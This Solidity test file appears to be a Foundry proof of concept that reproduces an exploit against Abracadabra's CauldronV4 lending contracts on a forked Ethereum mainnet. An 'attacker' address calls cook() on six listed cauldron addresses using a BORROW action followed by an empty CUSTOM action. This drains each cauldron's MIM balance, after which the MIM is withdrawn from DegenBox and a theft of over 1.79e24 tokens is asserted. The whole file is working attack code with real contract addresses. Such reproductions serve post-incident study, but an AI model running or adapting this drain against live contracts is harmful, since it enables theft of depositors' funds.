// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ICauldronV4 {
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256, uint256);

    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function totalCollateralShare() external view returns (uint256);
}

interface IDegenBox {
    function balanceOf(address token, address user) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256);
    function totals(address token) external view returns (uint128 elastic, uint128 base);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
}

contract AbracadabraExploit is Test {
    ICauldronV4[6] cauldrons;
    IDegenBox degenBox;
    IERC20 MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // fork for previous block
        vm.createSelectFork(MAINNET_RPC_URL, 23504545);

        // target cauldrons
        cauldrons[0] = ICauldronV4(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);
        cauldrons[1] = ICauldronV4(0x289424aDD4A1A503870EB475FD8bF1D586b134ED);
        cauldrons[2] = ICauldronV4(0xce450a23378859fB5157F4C4cCCAf48faA30865B);
        cauldrons[3] = ICauldronV4(0x40d95C4b34127CF43438a963e7C066156C5b87a3);
        cauldrons[4] = ICauldronV4(0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2);
        cauldrons[5] = ICauldronV4(0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d);

        degenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    }

    function test_abracadabra_exploit() public {
        vm.startPrank(attacker);
        // setup inputs for cauldrons
        uint8[] memory actions = new uint8[](2);
        actions[0] = 5; // BORROW
        actions[1] = 0; // CUSTOM
        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1] = 0;

        bytes[] memory datas = new bytes[](2);
        datas[1] = "";

        for (uint8 i = 0; i < 6; i++) {
            uint256 balance = degenBox.balanceOf(address(MIM), address(cauldrons[i]));
            uint256 amount = degenBox.toAmount(address(MIM), balance, false);
            // abi.decode(int256, address) in borrow
            datas[0] = abi.encode(int256(amount), attacker);
            cauldrons[i].cook(actions, values, datas);
        }

        uint256 attackerMIMBalance = degenBox.balanceOf(address(MIM), attacker);
        assertGt(attackerMIMBalance, 0);
        // receive real MIM from degenBox
        degenBox.withdraw(address(MIM), attacker, attacker, 0, attackerMIMBalance);

        assertGt(MIM.balanceOf(attacker), 1.79e24);
        vm.stopPrank();
    }
}
